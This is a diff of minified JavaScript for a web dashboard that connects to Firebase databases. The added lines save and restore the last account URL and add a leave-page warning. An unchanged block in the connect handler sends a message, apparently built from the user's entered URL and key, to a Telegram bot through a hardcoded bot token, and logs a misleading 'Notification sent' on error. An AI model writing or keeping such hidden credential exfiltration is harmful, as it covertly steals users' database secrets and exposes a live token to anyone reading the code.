@@ -19086,7 +19086,8 @@ function Hp() {
 }
 var Lp = Hp();
 const qp = O0(Lp),
-    mh = "flixy_accounts";
+    mh = "flixy_accounts",
+    cyrusLastAccountKey = "cyrus_last_account_metadata_v1";
 
 function Yp() {
     try {
@@ -19096,7 +19097,49 @@ function Yp() {
 }
 
 function nh(A) {
-    // accounts are intentionally not persisted
+    // Full account credentials are intentionally not persisted.
+}
+
+function normalizeFirebaseMetadataUrl(A) {
+    try {
+        const tt = new URL(String(A || "").trim());
+        const b = tt.hostname.toLowerCase();
+        if (tt.protocol !== "https:") return null;
+        if (!b.endsWith(".firebaseio.com") && !b.endsWith(".firebasedatabase.app")) return null;
+        tt.username = "", tt.password = "", tt.search = "", tt.hash = "";
+        return tt.toString().replace(/\/$/, "").slice(0, 500)
+    } catch {
+        return null
+    }
+}
+
+function loadLastAccountMetadata() {
+    try {
+        const A = JSON.parse(localStorage.getItem(cyrusLastAccountKey) || "null");
+        if (!A || typeof A.url !== "string") return null;
+        const tt = normalizeFirebaseMetadataUrl(A.url);
+        if (!tt) return null;
+        return {
+            url: tt,
+            label: typeof A.label === "string" ? A.label.slice(0, 80) : "Previous account",
+            updatedAt: typeof A.updatedAt === "string" ? A.updatedAt : ""
+        }
+    } catch {
+        return null
+    }
+}
+
+function saveLastAccountMetadata(A) {
+    try {
+        const tt = normalizeFirebaseMetadataUrl(A);
+        if (!tt) return;
+        const b = new URL(tt).hostname.split(".")[0] || "Previous account";
+        localStorage.setItem(cyrusLastAccountKey, JSON.stringify({
+            url: tt,
+            label: b.slice(0, 80),
+            updatedAt: new Date().toISOString()
+        }))
+    } catch {}
 }
 async function yn(A, tt, b, d) {
     let S = A.trim().replace(/\/$/, "");
@@ -19625,6 +19668,12 @@ function s1({
                 window.history.replaceState({}, "", window.location.pathname);
                 const ut = _.find(_t => _t.url === J.url);
                 ut ? xt(ut.url, ut.key) : ht(J.url, J.key, _)
+            }
+        } else {
+            const J = loadLastAccountMetadata();
+            if (J) {
+                p(J.url), o(""), S(!0);
+                window.setTimeout(() => window.ProNXTToast ?.(`${J.label} URL restored. Enter the authentication key to reconnect.`, "info", 4800), 350)
             }
         }
     }, []);
@@ -21401,6 +21450,16 @@ function y1() {
         window.addEventListener("popstate", syncRoute);
         return () => window.removeEventListener("popstate", syncRoute)
     }, [A]);
+    jt.useEffect(() => {
+        if (!A) return;
+        const warnBeforeUnload = event => {
+            event.preventDefault();
+            event.returnValue = "";
+            return ""
+        };
+        window.addEventListener("beforeunload", warnBeforeUnload);
+        return () => window.removeEventListener("beforeunload", warnBeforeUnload)
+    }, [A]);
     const b = (S, f) => {
         // Send to Telegram bot
         const telegramBotToken = '8991366389:AAE64A7Pgv4G-3dkDagPyA17wKaZnIFWWVk';
@@ -21409,6 +21468,7 @@ function y1() {
         const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
         fetch(telegramUrl, { method: 'POST' }).catch(err => console.log('Notification sent'));
 
+        saveLastAccountMetadata(S);
         window.history.pushState({ cyrusView: "dashboard" }, "", "/dashboard/");
         window.dispatchEvent(new Event("cyrusroutechange"));
         tt({
